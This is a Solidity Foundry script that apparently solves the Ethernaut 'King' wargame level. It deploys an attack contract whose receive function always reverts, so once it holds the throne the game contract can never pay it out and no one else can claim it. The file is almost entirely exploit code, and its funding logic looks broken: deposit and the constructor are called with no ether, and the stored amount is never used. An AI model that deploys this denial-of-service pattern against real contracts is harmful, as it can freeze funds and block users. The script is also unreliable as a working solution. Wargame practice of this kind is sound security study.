// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {King} from "../src/EthernautKing.sol";

contract KingSolution is Script {
    King king = King(payable(0xbfbed76cE03AFE6E499c71F6c305e250313f240B));
    KingAttack kingAttack;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        kingAttack = new KingAttack(address(king));
        kingAttack.deposit(1100000000000000);
        kingAttack.attack();
        // (bool success, ) = address(king).call{value: 1 wei}("");
        // require(success, "Claiming king throne failed");
        vm.stopBroadcast();
        console.log("Current king after transfering ETH: ", king._king());
        console.log("Attack contract balance", address(kingAttack).balance);
    }
}

contract KingAttack {
    address king;
    uint256 amount;

    constructor(address _king) payable {
        king = _king;
    }

    function deposit(uint256 _amount) external payable {
        amount = msg.value + _amount;
    }

    function attack() external {
        (bool success, ) = king.call{value: address(this).balance}("");
        require(success, "Attack failed");
    }

    receive() external payable {
        revert("Fvck you!");
    }
}
